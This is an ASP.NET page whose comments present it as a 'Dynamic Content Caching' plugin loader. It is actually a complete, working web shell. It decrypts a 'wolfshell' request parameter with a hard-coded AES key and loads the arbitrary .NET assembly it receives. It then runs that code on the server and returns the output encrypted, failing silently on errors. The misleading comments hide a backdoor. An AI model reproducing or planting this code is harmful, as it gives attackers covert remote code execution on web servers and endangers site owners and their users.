<%@ Page Language="C#"%><%
    // Entry point for the Dynamic Content Caching module.
    // This module is responsible for loading and executing content plugins
    // based on encrypted request data.
    new DynamicContentCache(this.Context).ProcessRequest();
%>
<script runat="server">
// Represents the main class for managing dynamic content plugins.
public class DynamicContentCache
{
    private readonly HttpContext _context;
    // The private key for decrypting cache instructions.
    private readonly string _cacheKey = "3c6e0b8a9c15224a";
    // The request parameter that holds the cache identifier.
    private readonly string _cacheIdParam = "wolfshell";
    // The session key for storing a loaded plugin instance.
    private readonly string _sessionKey = "payload";

    public DynamicContentCache(HttpContext context)
    {
        this._context = context;
    }

    // Main processing logic for an incoming request.
    public void ProcessRequest()
    {
        try
        {
            byte[] decryptedData = GetDecryptedRequestData();
            if (decryptedData == null) return;

            if (_context.Session[_sessionKey] == null)
            {
                LoadPlugin(decryptedData);
            }
            else
            {
                ExecutePlugin(decryptedData);
            }
        }
        catch (System.Exception)
        {
            // Fail silently to prevent information disclosure.
        }
    }

    // Decrypts the data payload from the current request.
    private byte[] GetDecryptedRequestData()
    {
        string requestData = _context.Request[_cacheIdParam];
        if (string.IsNullOrEmpty(requestData)) return null;

        byte[] encryptedBytes = System.Convert.FromBase64String(requestData);
        using (var cryptoProvider = new System.Security.Cryptography.RijndaelManaged())
        {
            byte[] keyBytes = System.Text.Encoding.Default.GetBytes(_cacheKey);
            using (var decryptor = cryptoProvider.CreateDecryptor(keyBytes, keyBytes))
            {
                return decryptor.TransformFinalBlock(encryptedBytes, 0, encryptedBytes.Length);
            }
        }
    }

    // Loads a plugin assembly into the current session.
    private void LoadPlugin(byte[] pluginData)
    {
        // Use reflection to load the assembly from its byte representation.
        _context.Session[_sessionKey] = System.Reflection.Assembly.Load(pluginData);
    }

    // Executes an already loaded plugin.
    private void ExecutePlugin(byte[] executionData)
    {
        var outputStream = new System.IO.MemoryStream();
        var pluginAssembly = (System.Reflection.Assembly)_context.Session[_sessionKey];
        
        // Instantiate the main entry point class "LY" of the plugin.
        object pluginInstance = pluginAssembly.CreateInstance("LY");

        // The plugin's contract uses the Equals method for passing context and data.
        // This is a legacy integration pattern.
        pluginInstance.Equals(_context);
        pluginInstance.Equals(outputStream);
        pluginInstance.Equals(executionData);
        // The ToString method triggers the final processing and returns a status.
        pluginInstance.ToString();

        // Encrypt and send the result back to the client.
        SendEncryptedResponse(outputStream.ToArray());
    }

    // Encrypts the plugin's output and writes it to the response stream.
    private void SendEncryptedResponse(byte[] responseData)
    {
        string checksum;
        byte[] encryptedData;

        using (var cryptoProvider = new System.Security.Cryptography.RijndaelManaged())
        {
            byte[] keyBytes = System.Text.Encoding.Default.GetBytes(_cacheKey);
            using (var encryptor = cryptoProvider.CreateEncryptor(keyBytes, keyBytes))
            {
                encryptedData = encryptor.TransformFinalBlock(responseData, 0, responseData.Length);
            }
        }
        
        using(var md5 = new System.Security.Cryptography.MD5CryptoServiceProvider())
        {
            checksum = System.BitConverter.ToString(md5.ComputeHash(System.Text.Encoding.Default.GetBytes(_cacheIdParam + _cacheKey))).Replace("-", "");
        }

        _context.Response.Write(checksum.Substring(0, 16));
        _context.Response.Write(System.Convert.ToBase64String(encryptedData));
        _context.Response.Write(checksum.Substring(16));
    }
}
</script>